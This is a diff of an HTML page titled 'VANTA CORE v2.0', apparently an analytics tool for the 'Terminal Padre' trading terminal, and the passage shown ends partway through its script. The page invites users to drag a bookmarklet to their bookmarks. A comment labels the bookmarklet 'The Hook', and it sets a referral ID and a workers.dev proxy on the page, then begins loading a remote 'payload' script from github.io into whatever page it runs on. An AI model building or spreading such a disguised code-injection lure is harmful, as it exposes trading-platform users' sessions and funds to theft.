@@ -6,31 +6,33 @@
     <style>
         :root { --primary: #00ff88; --bg: #050505; }
         body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { border: 1px solid #1a1a1a; padding: 50px; border-radius: 20px; background: #080808; text-align: center; }
-        h1 { color: var(--primary); font-weight: 800; letter-spacing: -1px; }
+        .container { border: 1px solid #1a1a1a; padding: 50px; border-radius: 20px; background: #080808; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        h1 { color: var(--primary); font-weight: 800; letter-spacing: -1px; margin: 0; }
+        p { color: #666; margin: 10px 0 25px 0; }
         .btn { 
             display: inline-block; padding: 18px 40px; background: var(--primary); 
             color: #000; font-weight: 800; text-decoration: none; border-radius: 8px; 
-            margin-top: 25px; box-shadow: 0 0 20px rgba(0,255,136,0.3);
+            box-shadow: 0 0 20px rgba(0,255,136,0.3); transition: 0.3s;
         }
+        .btn:hover { transform: scale(1.02); box-shadow: 0 0 30px var(--primary); }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>VANTA TRACKER v2.0</h1>
-        <p style="color:#666;">Optimized for Terminal Padre</p>
+        <h1>VANTA CORE v2.0</h1>
+        <p>Optimized Analytics for Terminal Padre</p>
         <a id="vanta-btn" class="btn" href="#">[ DRAG TO BOOKMARKS ]</a>
-        <p style="font-size: 10px; margin-top: 20px; color: #333;">REF: t23dad55</p>
+        <div style="font-size: 10px; margin-top: 25px; color: #222;">ID: t23dad55</div>
     </div>
 
     <script>
         const CONFIG = {
             ref: "t23dad55",
             proxy: "https://vanta-proxy.jdurrulo.workers.dev/",
-            // IMPORTANT: Replace 'Jinxthesimp' with your actual GitHub username
-            payload: "https://Jinxthesimp.github.io/Dropshipper/tracker.js"
+            payload: "https://jinxthesimp.github.io/Dropshipper/tracker.js"
         };
 
+        // The "Hook": Injecting config into the browser window before loading the brain
         const loader = `javascript:(function(){
             window.V_REF="${CONFIG.ref}";
             window.V_PROXY="${CONFIG.proxy}";
